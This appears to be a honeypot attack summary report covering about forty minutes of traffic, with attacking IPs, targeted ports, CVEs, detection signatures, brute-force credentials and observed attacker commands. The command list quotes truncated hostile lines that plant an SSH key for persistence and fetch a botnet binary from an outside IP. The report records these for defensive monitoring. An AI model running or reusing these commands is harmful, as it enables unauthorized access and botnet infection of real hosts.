Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-01T16:01:38Z
**Timeframe of Analysis:** 2025-10-01T15:20:01Z to 2025-10-01T16:00:02Z
**Source Files:**
- agg_log_20251001T152001Z.json
- agg_log_20251001T154001Z.json
- agg_log_20251001T160002Z.json

### Executive Summary

This report summarizes 29,997 events collected from the honeypot network. The majority of the activity was related to scans of SIP services, primarily originating from the IP address 92.205.59.208, which was responsible for over 72% of the observed events. A significant number of brute-force attempts and command executions were observed on the Cowrie SSH honeypot. Attackers were seen attempting to download and execute various malware payloads, perform system reconnaissance, and modify SSH configurations to maintain persistence.

### Detailed Analysis

**Attacks by Honeypot**
- Sentrypeer: 21,796
- Cowrie: 5,450
- Honeytrap: 983
- Suricata: 858
- Ciscoasa: 781
- Dionaea: 45
- ssh-rsa: 30
- Redishoneypot: 10
- Tanner: 12
- Adbhoney: 7
- ConPot: 6
- H0neytr4p: 7
- Mailoney: 6
- Honeyaml: 4
- ElasticPot: 1
- Ipphoney: 1

**Top Attacking IPs**
- 92.205.59.208: 21,841
- 103.130.215.15: 3,331
- 162.240.225.187: 154
- 107.175.209.171: 148
- 104.168.103.115: 128
- 88.210.63.16: 190
- 185.156.73.166: 205
- 92.63.197.55: 197
- 185.156.73.167: 193
- 92.63.197.59: 187
- 103.174.212.243: 216
- 202.143.111.139: 202
- 203.23.199.85: 118
- 34.128.77.56: 109

**Top Targeted Ports/Protocols**
- 5060: 21,796
- 22: 938
- UDP/5060: 103
- 8333: 69
- 9000: 30
- TCP/22: 27
- 31337: 20
- 3306: 20
- 80: 11

**Most Common CVEs**
- CVE-2002-0012
- CVE-2002-0013
- CVE-1999-0517
- CVE-2005-4050
- CVE-2019-11500

**Commands Attempted by Attackers**
- uname -a
- whoami
- w
- top
- uname
- uname -m
- crontab -l
- lscpu | grep Model
- which ls
- ls -lh $(which ls)
- free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
- cat /proc/cpuinfo | grep name | wc -l
- cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..." >> .ssh/authorized_keys && ...
- cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; ...
- rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; ...

**Signatures Triggered**
- ET DROP Dshield Block Listed Source group 1 (ID: 2402000)
- ET SCAN MS Terminal Server Traffic on Non-standard Port (ID: 2023753)
- ET VOIP REGISTER Message Flood UDP (ID: 2009699)
- ET SCAN NMAP -sS window 1024 (ID: 2009582)
- ET HUNTING RDP Authentication Bypass Attempt (ID: 2034857)
- ET INFO Reserved Internal IP Traffic (ID: 2002752)
- GPL INFO SOCKS Proxy attempt (ID: 2100615)
- ET SCAN Suspicious inbound to Oracle SQL port 1521 (ID: 2010936)
- ET DROP Spamhaus DROP Listed Traffic Inbound

**Users / Login Attempts (user/password)**
- 345gs5662d34/345gs5662d34
- root/ (empty password)
- root/3245gs5662d34
- agent/agent
- old/sor123in
- root/zhbjETuyMffoL8F
- titu/Ahgf3487@rtjhskl854hd47893@#a4nC
- root/nPSpP4PBW0
- crystal/crystal123
- dci/dci123

**Files Uploaded/Downloaded**
- arm.urbotnetisass
- arm5.urbotnetisass
- arm6.urbotnetisass
- arm7.urbotnetisass
- x86_32.urbotnetisass
- mips.urbotnetisass
- mipsel.urbotnetisass
- Mozi.a+varcron

**HTTP User-Agents**
- No relevant data was found in the logs.

**SSH Clients**
- No relevant data was found in the logs.

**SSH Servers**
- No relevant data was found in the logs.

**Top Attacker AS Organizations**
- No relevant data was found in the logs.

### Key Observations and Anomalies

- **High Volume Scanning:** The IP address 92.205.59.208 was exceptionally active, focusing almost exclusively on scanning port 5060 (SIP), suggesting a large-scale, automated campaign targeting VoIP services.
- **Credential Stuffing & Brute-Forcing:** A wide variety of usernames and passwords were attempted, indicating credential stuffing from breached password lists alongside common brute-force attempts against the 'root' user.
- **Post-Exploitation Activity:** Attackers who successfully logged in immediately began reconnaissance using standard Linux commands (`uname`, `w`, `lscpu`, etc.). The primary goal appears to be deploying malware and securing persistent access by adding a public SSH key to `authorized_keys`.
- **Malware Delivery:** The commands show clear attempts to download and execute malware targeting various architectures (ARM, x86, MIPS), with filenames such as `urbotnetisass` and `Mozi.a`, indicating attempts to enlist the honeypot in a botnet.
- **Lack of Sophistication:** The majority of the attacks appear automated and non-targeted, relying on common vulnerabilities and weak credentials.
